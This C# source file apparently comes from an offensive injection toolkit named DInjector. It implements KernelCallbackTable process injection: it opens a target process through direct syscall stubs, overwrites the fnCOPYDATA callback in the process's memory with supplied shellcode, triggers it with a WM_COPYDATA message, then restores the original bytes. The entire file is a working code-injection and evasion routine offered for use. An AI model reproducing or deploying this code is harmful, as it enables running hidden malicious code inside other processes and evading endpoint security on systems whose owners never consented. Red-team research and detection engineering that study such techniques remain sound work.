using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class RemoteThreadKernelCB
    {
        [StructLayout(LayoutKind.Sequential)]
        internal struct KernelCallBackTable
        {
            public IntPtr fnCOPYDATA;
            public IntPtr fnCOPYGLOBALDATA;
            public IntPtr fnDWORD;
            public IntPtr fnNCDESTROY;
            public IntPtr fnDWORDOPTINLPMSG;
            public IntPtr fnINOUTDRAG;
            public IntPtr fnGETTEXTLENGTHS;
            public IntPtr fnINCNTOUTSTRING;
            public IntPtr fnPOUTLPINT;
            public IntPtr fnINLPCOMPAREITEMSTRUCT;
            public IntPtr fnINLPCREATESTRUCT;
            public IntPtr fnINLPDELETEITEMSTRUCT;
            public IntPtr fnINLPDRAWITEMSTRUCT;
            public IntPtr fnPOPTINLPUINT;
            public IntPtr fnPOPTINLPUINT2;
            public IntPtr fnINLPMDICREATESTRUCT;
            public IntPtr fnINOUTLPMEASUREITEMSTRUCT;
            public IntPtr fnINLPWINDOWPOS;
            public IntPtr fnINOUTLPPOINT5;
            public IntPtr fnINOUTLPSCROLLINFO;
            public IntPtr fnINOUTLPRECT;
            public IntPtr fnINOUTNCCALCSIZE;
            public IntPtr fnINOUTLPPOINT5_;
            public IntPtr fnINPAINTCLIPBRD;
            public IntPtr fnINSIZECLIPBRD;
            public IntPtr fnINDESTROYCLIPBRD;
            public IntPtr fnINSTRING;
            public IntPtr fnINSTRINGNULL;
            public IntPtr fnINDEVICECHANGE;
            public IntPtr fnPOWERBROADCAST;
            public IntPtr fnINLPUAHDRAWMENU;
            public IntPtr fnOPTOUTLPDWORDOPTOUTLPDWORD;
            public IntPtr fnOPTOUTLPDWORDOPTOUTLPDWORD_;
            public IntPtr fnOUTDWORDINDWORD;
            public IntPtr fnOUTLPRECT;
            public IntPtr fnOUTSTRING;
            public IntPtr fnPOPTINLPUINT3;
            public IntPtr fnPOUTLPINT2;
            public IntPtr fnSENTDDEMSG;
            public IntPtr fnINOUTSTYLECHANGE;
            public IntPtr fnHkINDWORD;
            public IntPtr fnHkINLPCBTACTIVATESTRUCT;
            public IntPtr fnHkINLPCBTCREATESTRUCT;
            public IntPtr fnHkINLPDEBUGHOOKSTRUCT;
            public IntPtr fnHkINLPMOUSEHOOKSTRUCTEX;
            public IntPtr fnHkINLPKBDLLHOOKSTRUCT;
            public IntPtr fnHkINLPMSLLHOOKSTRUCT;
            public IntPtr fnHkINLPMSG;
            public IntPtr fnHkINLPRECT;
            public IntPtr fnHkOPTINLPEVENTMSG;
            public IntPtr xxxClientCallDelegateThread;
            public IntPtr ClientCallDummyCallback;
            public IntPtr fnKEYBOARDCORRECTIONCALLOUT;
            public IntPtr fnOUTLPCOMBOBOXINFO;
            public IntPtr fnINLPCOMPAREITEMSTRUCT2;
            public IntPtr xxxClientCallDevCallbackCapture;
            public IntPtr xxxClientCallDitThread;
            public IntPtr xxxClientEnableMMCSS;
            public IntPtr xxxClientUpdateDpi;
            public IntPtr xxxClientExpandStringW;
            public IntPtr ClientCopyDDEIn1;
            public IntPtr ClientCopyDDEIn2;
            public IntPtr ClientCopyDDEOut1;
            public IntPtr ClientCopyDDEOut2;
            public IntPtr ClientCopyImage;
            public IntPtr ClientEventCallback;
            public IntPtr ClientFindMnemChar;
            public IntPtr ClientFreeDDEHandle;
            public IntPtr ClientFreeLibrary;
            public IntPtr ClientGetCharsetInfo;
            public IntPtr ClientGetDDEFlags;
            public IntPtr ClientGetDDEHookData;
            public IntPtr ClientGetListboxString;
            public IntPtr ClientGetMessageMPH;
            public IntPtr ClientLoadImage;
            public IntPtr ClientLoadLibrary;
            public IntPtr ClientLoadMenu;
            public IntPtr ClientLoadLocalT1Fonts;
            public IntPtr ClientPSMTextOut;
            public IntPtr ClientLpkDrawTextEx;
            public IntPtr ClientExtTextOutW;
            public IntPtr ClientGetTextExtentPointW;
            public IntPtr ClientCharToWchar;
            public IntPtr ClientAddFontResourceW;
            public IntPtr ClientThreadSetup;
            public IntPtr ClientDeliverUserApc;
            public IntPtr ClientNoMemoryPopup;
            public IntPtr ClientMonitorEnumProc;
            public IntPtr ClientCallWinEventProc;
            public IntPtr ClientWaitMessageExMPH;
            public IntPtr ClientWOWGetProcModule;
            public IntPtr ClientWOWTask16SchedNotify;
            public IntPtr ClientImmLoadLayout;
            public IntPtr ClientImmProcessKey;
            public IntPtr fnIMECONTROL;
            public IntPtr fnINWPARAMDBCSCHAR;
            public IntPtr fnGETTEXTLENGTHS2;
            public IntPtr fnINLPKDRAWSWITCHWND;
            public IntPtr ClientLoadStringW;
            public IntPtr ClientLoadOLE;
            public IntPtr ClientRegisterDragDrop;
            public IntPtr ClientRevokeDragDrop;
            public IntPtr fnINOUTMENUGETOBJECT;
            public IntPtr ClientPrinterThunk;
            public IntPtr fnOUTLPCOMBOBOXINFO2;
            public IntPtr fnOUTLPSCROLLBARINFO;
            public IntPtr fnINLPUAHDRAWMENU2;
            public IntPtr fnINLPUAHDRAWMENUITEM;
            public IntPtr fnINLPUAHDRAWMENU3;
            public IntPtr fnINOUTLPUAHMEASUREMENUITEM;
            public IntPtr fnINLPUAHDRAWMENU4;
            public IntPtr fnOUTLPTITLEBARINFOEX;
            public IntPtr fnTOUCH;
            public IntPtr fnGESTURE;
            public IntPtr fnPOPTINLPUINT4;
            public IntPtr fnPOPTINLPUINT5;
            public IntPtr xxxClientCallDefaultInputHandler;
            public IntPtr fnEMPTY;
            public IntPtr ClientRimDevCallback;
            public IntPtr xxxClientCallMinTouchHitTestingCallback;
            public IntPtr ClientCallLocalMouseHooks;
            public IntPtr xxxClientBroadcastThemeChange;
            public IntPtr xxxClientCallDevCallbackSimple;
            public IntPtr xxxClientAllocWindowClassExtraBytes;
            public IntPtr xxxClientFreeWindowClassExtraBytes;
            public IntPtr fnGETWINDOWDATA;
            public IntPtr fnINOUTSTYLECHANGE2;
            public IntPtr fnHkINLPMOUSEHOOKSTRUCTEX2;
        }

        public const uint WM_COPYDATA = 0x4A;

        public struct COPYDATASTRUCT
        {
            public IntPtr dwData;
            public int cbData;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpData;
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtOpenProcess(
            ref IntPtr ProcessHandle,
            DI.Data.Win32.Kernel32.ProcessAccessFlags DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtQueryInformationProcess(
            IntPtr ProcessHandle,
            DI.Data.Native.PROCESSINFOCLASS ProcessInformationClass,
            ref DI.Data.Native.PROCESS_BASIC_INFORMATION ProcessInformation,
            uint ProcessInformationLength,
            ref uint ReturnLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtReadVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint NumberOfBytesToRead,
            out uint NumberOfBytesReaded);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            out uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr FindWindowExA(
            IntPtr parentHandle,
            IntPtr hWndChildAfter,
            string className,
            string windowTitle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr SendMessageA(
            IntPtr hWnd,
            uint Msg,
            IntPtr wParam,
            ref COPYDATASTRUCT lParam);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        private static IntPtr findWindowExA(IntPtr parentHandle, IntPtr hWndChildAfter, string className, string windowTitle)
        {
            object[] parameters = { parentHandle, hWndChildAfter, className, windowTitle };
            var result = (IntPtr)DI.DynamicInvoke.Generic.DynamicAPIInvoke("user32.dll", "FindWindowExA", typeof(FindWindowExA), ref parameters);

            return result;
        }

        private static IntPtr sendMessageA(IntPtr hWnd, uint Msg, IntPtr wParam, ref COPYDATASTRUCT lParam)
        {
            object[] parameters = { hWnd, Msg, wParam, lParam };
            var result = (IntPtr)DI.DynamicInvoke.Generic.DynamicAPIInvoke("user32.dll", "SendMessageA", typeof(SendMessageA), ref parameters);

            return result;
        }

        private static bool closeHandle(IntPtr hObject)
        {
            object[] parameters = { hObject };
            return (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref parameters);
        }

        public static void Execute(byte[] shellcodeBytes, int processID)
        {
            var shellcode = shellcodeBytes;

            #region NtOpenProcess

            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtOpenProcess");
            NtOpenProcess sysNtOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));

            IntPtr hProcess = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();

            CLIENT_ID ci = new CLIENT_ID { UniqueProcess = (IntPtr)processID };

            DI.Data.Native.NTSTATUS ntstatus;

            ntstatus = sysNtOpenProcess(
                ref hProcess,
                DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa,
                ref ci);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtOpenProcess");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtOpenProcess: {ntstatus}");

            #endregion

            #region NtQueryInformationProcess

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtQueryInformationProcess");
            NtQueryInformationProcess sysNtQueryInformationProcess = (NtQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtQueryInformationProcess));

            DI.Data.Native.PROCESS_BASIC_INFORMATION bi = new DI.Data.Native.PROCESS_BASIC_INFORMATION();
            uint returnLength = 0;

            ntstatus = sysNtQueryInformationProcess(
                hProcess,
                DI.Data.Native.PROCESSINFOCLASS.ProcessBasicInformation,
                ref bi,
                (uint)(IntPtr.Size * 6),
                ref returnLength);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtQueryInformationProcess");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtQueryInformationProcess: {ntstatus}");

            IntPtr kernelCallbackAddress = (IntPtr)((Int64)bi.PebBaseAddress + 0x58);

            #endregion

            #region NtReadVirtualMemory (kernelCallbackAddress)

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtReadVirtualMemory");
            NtReadVirtualMemory sysNtReadVirtualMemory = (NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtReadVirtualMemory));

            IntPtr kernelCallback = Marshal.AllocHGlobal(IntPtr.Size);
            uint bytesRead = 0;

            ntstatus = sysNtReadVirtualMemory(
                hProcess,
                kernelCallbackAddress,
                kernelCallback,
                (uint)IntPtr.Size,
                out bytesRead);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtReadVirtualMemory, kernelCallbackAddress");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtReadVirtualMemory, kernelCallbackAddress: {ntstatus}");

            byte[] kernelCallbackBytes = new byte[bytesRead];
            Marshal.Copy(kernelCallback, kernelCallbackBytes, 0, (int)bytesRead);
            Marshal.FreeHGlobal(kernelCallback);
            IntPtr kernelCallbackValue = (IntPtr)BitConverter.ToInt64(kernelCallbackBytes, 0);

            #endregion

            #region NtReadVirtualMemory (kernelCallbackValue)

            int dataSize = Marshal.SizeOf(typeof(KernelCallBackTable));
            IntPtr data = Marshal.AllocHGlobal(dataSize);

            ntstatus = sysNtReadVirtualMemory(
                hProcess,
                kernelCallbackValue,
                data,
                (uint)dataSize,
                out uint _);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtReadVirtualMemory, kernelCallbackValue");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtReadVirtualMemory, kernelCallbackValue: {ntstatus}");

            KernelCallBackTable kernelStruct = (KernelCallBackTable)Marshal.PtrToStructure(data, typeof(KernelCallBackTable));
            Marshal.FreeHGlobal(data);

            #endregion

            #region NtReadVirtualMemory (kernelStruct.fnCOPYDATA)

            IntPtr origData = Marshal.AllocHGlobal(shellcode.Length);

            ntstatus = sysNtReadVirtualMemory(
                hProcess,
                kernelStruct.fnCOPYDATA,
                origData,
                (uint)shellcode.Length,
                out uint _);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtReadVirtualMemory, kernelStruct.fnCOPYDATA");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtReadVirtualMemory, kernelStruct.fnCOPYDATA: {ntstatus}");

            #endregion

            #region NtProtectVirtualMemory (PAGE_READWRITE)

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
            NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

            IntPtr protectAddress = kernelStruct.fnCOPYDATA;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            uint oldProtect = 0;

            ntstatus = sysNtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_READWRITE,
                out oldProtect);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, PAGE_READWRITE");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (shellcode)

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
            NtWriteVirtualMemory sysNtWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            ntstatus = sysNtWriteVirtualMemory(
                hProcess,
                kernelStruct.fnCOPYDATA,
                buffer,
                (uint)shellcode.Length,
                out uint _);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtWriteVirtualMemory, shellcode");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (oldProtect)

            ntstatus = sysNtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                oldProtect,
                out uint _);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, oldProtect");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

            #endregion

            #region FindWindowExA

            IntPtr hWindow = findWindowExA(IntPtr.Zero, IntPtr.Zero, Process.GetProcessById(processID).ProcessName, null);

            #endregion

            #region SendMessageA

            string msg = "Trigger\0";
            var cds = new COPYDATASTRUCT
            {
                dwData = new IntPtr(3),
                cbData = msg.Length,
                lpData = msg
            };

            sendMessageA(hWindow, WM_COPYDATA, IntPtr.Zero, ref cds);

            #endregion

            #region NtProtectVirtualMemory (PAGE_READWRITE)

            ntstatus = sysNtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_READWRITE,
                out oldProtect);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, PAGE_READWRITE");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (origData)

            ntstatus = sysNtWriteVirtualMemory(
                hProcess,
                kernelStruct.fnCOPYDATA,
                origData,
                (uint)shellcode.Length,
                out uint _);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtWriteVirtualMemory, origData");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtWriteVirtualMemory, origData: {ntstatus}");

            Marshal.FreeHGlobal(origData);

            #endregion

            #region NtProtectVirtualMemory (oldProtect)

            ntstatus = sysNtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                oldProtect,
                out uint _);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadKernelCB) [+] NtProtectVirtualMemory, oldProtect");
            else
                Console.WriteLine($"(RemoteThreadKernelCB) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

            #endregion

            closeHandle(hWindow);
            closeHandle(hProcess);
        }
    }
}
